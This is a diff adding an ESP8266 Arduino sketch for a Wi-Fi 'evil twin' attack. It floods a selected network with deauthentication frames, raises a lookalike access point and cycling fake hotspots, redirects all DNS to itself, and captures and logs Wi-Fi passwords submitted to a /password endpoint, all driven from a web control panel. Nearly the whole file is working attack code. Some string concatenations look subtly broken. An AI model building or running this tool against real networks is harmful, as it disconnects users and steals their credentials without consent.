@@ -1,0 +1,306 @@
+#include <Arduino.h>
+#include <ESP8266WiFi.h>
+#include <DNSServer.h>
+#include <ESP8266WebServer.h>
+
+// External function for sending raw Wi-Fi packets.
+extern "C" {
+#include "user_interface.h"
+}
+
+// ----------------- Constants & Globals -----------------
+const int LED_PIN = LED_BUILTIN;
+
+// AP configuration
+const char* AP_SSID = "EvilTwinAP";
+const char* FAKE_APS[] = {"FreeWiFi", "CoffeeShop", "PublicHotspot"};
+const size_t NUM_FAKE_APS = sizeof(FAKE_APS) / sizeof(FAKE_APS[0]);
+
+// Web server setup
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
+
+// Data structures
+typedef struct {
+  String ssid;
+  uint8_t ch;
+  uint8_t bssid[6];
+} NetworkInfo;
+
+// Network and state variables
+NetworkInfo networks[16];
+NetworkInfo selectedNetwork;
+String logs = "";
+String capturedPassword = "";
+
+// State flags
+bool hotspot_active = false;
+bool deauth_active = false;
+bool fakeAP_active = false;
+
+// Timers for non-blocking operations
+unsigned long lastScanTime = 0;
+unsigned long lastDeauthTime = 0;
+unsigned long lastFakeAPTime = 0;
+int fakeAPIndex = 0;
+
+// ----------------- Utility Functions -----------------
+
+// Converts a byte array to a hex string with colons.
+String bytesToHex(const uint8_t* b, size_t size) {
+  String str;
+  for (size_t i = 0; i < size; ++i) {
+    if (b[i] < 0x10) str += '0';
+    str += String(b[i], HEX);
+    if (i < size - 1) str += ":";
+  }
+  return str;
+}
+
+// Logs an event with a timestamp to the web log.
+void logEvent(String msg) {
+  logs += "[" + String(millis() / 1000) + "s] " + msg + "<br>";
+  Serial.println(msg);
+}
+
+// ----------------- Network & Attack Functions -----------------
+
+// Scans for nearby Wi-Fi networks.
+void performScan() {
+  int n = WiFi.scanNetworks();
+  // Clear previous scan results
+  for (int i = 0; i < 16; ++i) {
+    networks[i].ssid = "";
+  }
+  if (n > 0) {
+    for (int i = 0; i < n && i < 16; ++i) {
+      networks[i].ssid = WiFi.SSID(i);
+      networks[i].ch = WiFi.channel(i);
+      memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
+    }
+  }
+}
+
+// Sends a deauthentication packet to the selected network.
+void sendDeauthPacket() {
+  if (selectedNetwork.ssid == "") {
+    logEvent("Deauth failed: No target selected.");
+    return;
+  }
+  // The frame contains the destination MAC (broadcast), source MAC (AP), and BSSID (AP).
+  uint8_t deauthFrame[26] = {
+    0xC0, 0x00, 0x00, 0x00, // Management frame (deauth)
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC (broadcast)
+    0, 0, 0, 0, 0, 0, // Source MAC (AP)
+    0, 0, 0, 0, 0, 0, // BSSID (AP)
+    0x07, 0x00 // Reason code (deauth because of leaving)
+  };
+  memcpy(deauthFrame + 10, selectedNetwork.bssid, 6);
+  memcpy(deauthFrame + 16, selectedNetwork.bssid, 6);
+
+  wifi_set_channel(selectedNetwork.ch);
+  wifi_send_pkt_freedom(deauthFrame, sizeof(deauthFrame), 0);
+  logEvent("Deauth packet sent to " + selectedNetwork.ssid);
+}
+
+// Starts or stops the main Evil Twin access point.
+void controlHotspot(bool start) {
+  if (start) {
+    WiFi.softAP(AP_SSID);
+    dnsServer.start(53, "*", WiFi.softAPIP());
+    hotspot_active = true;
+    logEvent("Evil Twin AP '" + String(AP_SSID) + "' started.");
+  } else {
+    WiFi.softAPdisconnect(true);
+    hotspot_active = false;
+    logEvent("Evil Twin AP stopped.");
+  }
+}
+
+// Cycles through fake AP names.
+void cycleFakeAP() {
+  WiFi.softAP(FAKE_APS[fakeAPIndex]);
+  logEvent("Fake AP active: " + String(FAKE_APS[fakeAPIndex]));
+  fakeAPIndex = (fakeAPIndex + 1) % NUM_FAKE_APS;
+}
+
+// ----------------- Web UI Handlers -----------------
+
+String getHeader() {
+  String CSS = R"rawliteral(
+    body { background: #111; color: #00FF00; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 0; }
+    nav { background: #004400; color: #00FF00; padding: 1.5em; text-align: center; font-weight: bold; border-bottom: 2px solid #00FF00; }
+    .container { border: 1px solid #00FF00; padding: 15px; margin: 15px; border-radius: 10px; background: #002200; }
+    .flex { display: flex; flex-wrap: wrap; justify-content: center; }
+    .section { flex: 1 1 400px; margin: 10px; min-width: 300px; }
+    button { padding: 10px; margin: 5px; background: #111; color: #00FF00; border: 1px solid #00FF00; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; }
+    button:hover { background-color: #004400; }
+    input { padding: 8px; width: 80%; margin: 5px; background: #111; color: #00FF00; border: 1px solid #00FF00; border-radius: 5px; }
+    .networks-list, .logs-list { max-height: 200px; overflow-y: auto; border: 1px solid #00FF00; padding: 5px; background: #001100; }
+    .status { font-weight: bold; }
+    .on { color: lime; }
+    .off { color: red; }
+    .target { font-weight: bold; color: yellow; }
+  )rawliteral";
+  return "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>" + CSS + "</style><title>ESP8266 Wi-Fi Portal</title></head><body><nav>ESP8266 Wi-Fi Portal</nav><div class='flex'>";
+}
+
+String getFooter() {
+  return "</div><script>"
+         "function refreshData(){"
+         "  fetch('/networks_data').then(r=>r.text()).then(t=>{document.getElementById('networks-list').innerHTML=t;});"
+         "  fetch('/logs_data').then(r=>r.text()).then(t=>{document.getElementById('logs-list').innerHTML=t; document.getElementById('logs-list').scrollTop=document.getElementById('logs-list').scrollHeight;});"
+         "}"
+         "setInterval(refreshData, 2000);"
+         "</script></body></html>";
+}
+
+String getIndexPage() {
+  String page = getHeader();
+
+  // Left: Controls
+  page += "<div class='section container'><h2>Control Panel</h2>";
+  page += "<h3>Evil Twin AP: <span class='status " + (hotspot_active ? "on" : "off") + "'>" + (hotspot_active ? "ON" : "OFF") + "</span></h3>";
+  page += "<a href='/?hotspot=start'><button>Start AP</button></a> <a href='/?hotspot=stop'><button>Stop AP</button></a>";
+  page += "<h3>Deauth Attack: <span class='status " + (deauth_active ? "on" : "off") + "'>" + (deauth_active ? "ON" : "OFF") + "</span></h3>";
+  page += "<a href='/?deauth=start'><button>Start Deauth</button></a> <a href='/?deauth=stop'><button>Stop Deauth</button></a>";
+  page += "<h3>Fake Hotspots: <span class='status " + (fakeAP_active ? "on" : "off") + "'>" + (fakeAP_active ? "ON" : "OFF") + "</span></h3>";
+  page += "<a href='/?fake=start'><button>Start Fake APs</button></a> <a href='/?fake=stop'><button>Stop Fake APs</button></a>";
+  page += "<h3>Captured Password</h3><p class='target'>" + capturedPassword + "</p>";
+  page += "</div>";
+
+  // Middle: Networks
+  page += "<div class='section container'><h2>Available Networks</h2>";
+  page += "<h3>Selected Target: <span class='target'>" + (selectedNetwork.ssid.length() > 0 ? selectedNetwork.ssid : "None") + "</span></h3>";
+  page += "<div id='networks-list' class='networks-list'></div>";
+  page += "</div>";
+
+  // Right: Logs
+  page += "<div class='section container'><h2>Live Logs</h2>";
+  page += "<div id='logs-list' class='logs-list'></div>";
+  page += "</div>";
+
+  page += getFooter();
+  return page;
+}
+
+// Handles the main page requests and control actions.
+void handleRoot() {
+  if (webServer.hasArg("hotspot")) {
+    controlHotspot(webServer.arg("hotspot") == "start");
+  }
+  if (webServer.hasArg("deauth")) {
+    deauth_active = (webServer.arg("deauth") == "start");
+    logEvent("Deauth attack " + (deauth_active ? "started" : "stopped"));
+  }
+  if (webServer.hasArg("fake")) {
+    fakeAP_active = (webServer.arg("fake") == "start");
+    if (fakeAP_active) {
+      logEvent("Fake Hotspots enabled.");
+    } else {
+      controlHotspot(true); // Revert to main AP after stopping fake ones
+      logEvent("Fake Hotspots disabled.");
+    }
+  }
+  if (webServer.hasArg("select")) {
+    String sel_bssid = webServer.arg("select");
+    bool found = false;
+    for (int i = 0; i < 16; ++i) {
+      if (networks[i].ssid != "" && bytesToHex(networks[i].bssid, 6) == sel_bssid) {
+        selectedNetwork = networks[i];
+        logEvent("Selected target: " + selectedNetwork.ssid + " on channel " + String(selectedNetwork.ch));
+        found = true;
+        break;
+      }
+    }
+    if (!found) {
+      logEvent("Error: Selected network not found.");
+      selectedNetwork.ssid = "";
+    }
+  }
+
+  webServer.send(200, "text/html", getIndexPage());
+}
+
+// Provides the list of networks for the web UI.
+void handleNetworksData() {
+  String list = "";
+  for (int i = 0; i < 16; ++i) {
+    if (networks[i].ssid != "") {
+      list += "<div>" + networks[i].ssid + " <a href='/?select=" + bytesToHex(networks[i].bssid, 6) + "'>Select</a></div>";
+    }
+  }
+  webServer.send(200, "text/html", list);
+}
+
+// Provides the logs for the web UI.
+void handleLogsData() {
+  webServer.send(200, "text/html", logs);
+}
+
+// Handles the POST request for password submission.
+void handleSubmit() {
+  if (webServer.method() == HTTP_POST && webServer.hasArg("password")) {
+    capturedPassword = webServer.arg("password");
+    logEvent("Password submitted for " + selectedNetwork.ssid + ": " + capturedPassword);
+    String response = getHeader() + "<div class='container'><h2>Password Captured</h2><p>Password: " + capturedPassword + "</p></div>" + getFooter();
+    webServer.send(200, "text/html", response);
+  } else {
+    webServer.send(400, "text/plain", "Bad Request");
+  }
+}
+
+// Handles the DNS requests, redirects all to the web server.
+void handleDNS() {
+  webServer.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
+  webServer.send(302, "text/plain", "");
+}
+
+// ----------------- Setup & Loop -----------------
+
+void setup() {
+  Serial.begin(115200);
+  pinMode(LED_PIN, OUTPUT);
+  logEvent("ESP8266 started.");
+
+  // Configure Wi-Fi in Station + Access Point mode.
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+  controlHotspot(true);
+
+  // Web server routes
+  webServer.on("/", HTTP_GET, handleRoot);
+  webServer.on("/networks_data", HTTP_GET, handleNetworksData);
+  webServer.on("/logs_data", HTTP_GET, handleLogsData);
+  webServer.on("/password", HTTP_POST, handleSubmit);
+  webServer.onNotFound(handleDNS);
+  webServer.begin();
+
+  performScan();
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+
+  // LED indicator for hotspot status
+  digitalWrite(LED_PIN, hotspot_active ? LOW : HIGH); // LED_BUILTIN is inverted
+
+  // Non-blocking network scan timer
+  if (millis() - lastScanTime > 5000) {
+    performScan();
+    lastScanTime = millis();
+  }
+
+  // Non-blocking deauth timer
+  if (deauth_active && millis() - lastDeauthTime > 100 && selectedNetwork.ssid != "") {
+    sendDeauthPacket();
+    lastDeauthTime = millis();
+  }
+
+  // Non-blocking fake AP cycle timer
+  if (fakeAP_active && millis() - lastFakeAPTime > 7000) { // Cycle every 7 seconds
+    cycleFakeAP();
+    lastFakeAPTime = millis();
+  }
+}
